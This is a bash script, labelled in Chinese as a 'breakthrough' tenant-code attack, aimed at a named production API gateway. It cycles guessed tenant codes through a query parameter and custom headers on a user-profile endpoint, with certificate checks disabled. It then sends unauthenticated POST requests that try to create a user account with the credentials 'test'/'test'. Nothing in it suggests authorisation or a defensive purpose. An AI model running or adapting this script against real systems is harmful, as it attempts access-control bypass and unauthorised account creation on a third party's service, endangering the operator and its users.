#!/bin/bash
# 突破 - Tenant Code测试

BASE="https://gw.vtpglobal.com.vn"

echo "[💥💥💥] BREAKTHROUGH - Tenant Code攻击"
echo ""

# 1. 测试users/profile的tenant code
echo "[+] 测试Tenant Code参数..."
TENANTS=(
  "vtp"
  "viettelpost"
  "default"
  "admin"
  "system"
  "public"
  "guest"
  "VTP"
  "VIETTELPOST"
  "vietnam"
  "vn"
  "global"
  "vtpglobal"
)

for tenant in "${TENANTS[@]}"; do
  echo "  [*] Tenant: $tenant"
  curl -sk "$BASE/vtp-user/api/v1/users/profile?tenantCode=$tenant" -w "\nHTTP: %{http_code}\n" | head -10
  curl -sk "$BASE/vtp-user/api/v1/users/profile" \
    -H "X-Tenant-Code: $tenant" -w "\nHTTP: %{http_code}\n" | head -10
  curl -sk "$BASE/vtp-user/api/v1/users/profile" \
    -H "Tenant-Code: $tenant" -w "\nHTTP: %{http_code}\n" | head -10
done

echo ""
echo "[+] POST to /vtp-user/api/v1/users..."
curl -sk "$BASE/vtp-user/api/v1/users" -X POST \
  -H "Content-Type: application/json" \
  -d '{}' -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/users" -X POST \
  -H "Content-Type: application/json" \
  -d '{"tenantCode":"vtp"}' -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/users" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' -w "\nHTTP: %{http_code}\n" | head -20
